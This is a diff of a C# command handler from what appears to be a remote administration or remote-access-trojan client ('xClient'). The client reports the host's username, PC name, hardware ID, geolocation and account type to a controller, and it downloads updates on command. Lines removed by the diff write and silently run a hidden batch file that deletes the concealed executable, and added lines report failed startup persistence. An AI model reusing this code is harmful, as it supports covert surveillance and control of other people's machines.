@@ -1,25 +1,32 @@
 ﻿using System;
-using System.Diagnostics;
 using System.IO;
 using System.Net;
 using System.Threading;
 using xClient.Config;
+using xClient.Core.Data;
 using xClient.Core.Helper;
+using xClient.Core.Installation;
 using xClient.Core.Networking;
 using xClient.Core.Utilities;
 
 namespace xClient.Core.Commands
 {
-    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE CONNECTION. */
+    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE CONNECTION COMMANDS. */
     public static partial class CommandHandler
     {
         public static void HandleGetAuthentication(Packets.ServerPackets.GetAuthentication command, Client client)
         {
             GeoLocationHelper.Initialize();
-            new Packets.ClientPackets.GetAuthenticationResponse(Settings.VERSION, SystemCore.OperatingSystem, SystemCore.AccountType,
-                GeoLocationHelper.GeoInfo.country, GeoLocationHelper.GeoInfo.country_code, 
-                GeoLocationHelper.GeoInfo.region, GeoLocationHelper.GeoInfo.city, GeoLocationHelper.ImageIndex, 
-                SystemCore.GetId(), SystemCore.GetUsername(), SystemCore.GetPcName(), Settings.TAG).Execute(client);
+            new Packets.ClientPackets.GetAuthenticationResponse(Settings.VERSION, PlatformHelper.FullName, WindowsAccountHelper.GetAccountType(),
+                GeoLocationHelper.GeoInfo.country, GeoLocationHelper.GeoInfo.country_code,
+                GeoLocationHelper.GeoInfo.region, GeoLocationHelper.GeoInfo.city, GeoLocationHelper.ImageIndex,
+                DevicesHelper.HardwareId, WindowsAccountHelper.GetName(), SystemHelper.GetPcName(), Settings.TAG).Execute(client);
+
+            if (ClientData.AddToStartupFailed)
+            {
+                Thread.Sleep(2000);
+                new Packets.ClientPackets.SetStatus("Adding to startup failed.").Execute(client);
+            }
         }
 
         public static void HandleDoClientUpdate(Packets.ServerPackets.DoClientUpdate command, Client client)
@@ -47,7 +54,7 @@ namespace xClient.Core.Commands
                     {
                         new Packets.ClientPackets.SetStatus("Updating...").Execute(client);
 
-                        SystemCore.UpdateClient(client, filePath);
+                        ClientUpdater.Update(client, filePath);
                     }
                 }
                 catch (Exception ex)
@@ -82,7 +89,7 @@ namespace xClient.Core.Commands
 
                 new Packets.ClientPackets.SetStatus("Updating...").Execute(client);
 
-                SystemCore.UpdateClient(client, tempFile);
+                ClientUpdater.Update(client, tempFile);
             }).Start();
         }
 
@@ -90,41 +97,7 @@ namespace xClient.Core.Commands
         {
             new Packets.ClientPackets.SetStatus("Uninstalling... bye ;(").Execute(client);
 
-            SystemCore.RemoveTraces();
-
-            try
-            {
-                string filename = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    FileHelper.GetRandomFilename(12, ".bat"));
-
-                string uninstallBatch = (Settings.INSTALL && Settings.HIDEFILE)
-                    ? "@echo off" + "\n" +
-                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 20 localhost > nul" + "\n" +
-                      "del /A:H " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-                      "del " + "\"" + filename + "\""
-                    : "@echo off" + "\n" +
-                      "echo DONT CLOSE THIS WINDOW!" + "\n" +
-                      "ping -n 20 localhost > nul" + "\n" +
-                      "del " + "\"" + SystemCore.MyPath + "\"" + "\n" +
-                      "del " + "\"" + filename + "\""
-                    ;
-
-                File.WriteAllText(filename, uninstallBatch);
-                ProcessStartInfo startInfo = new ProcessStartInfo
-                {
-                    WindowStyle = ProcessWindowStyle.Hidden,
-                    CreateNoWindow = true,
-                    UseShellExecute = true,
-                    FileName = filename
-                };
-                Process.Start(startInfo);
-            }
-            finally
-            {
-                SystemCore.Disconnect = true;
-                client.Disconnect();
-            }
+            ClientUninstaller.Uninstall(client);
         }
     }
 }
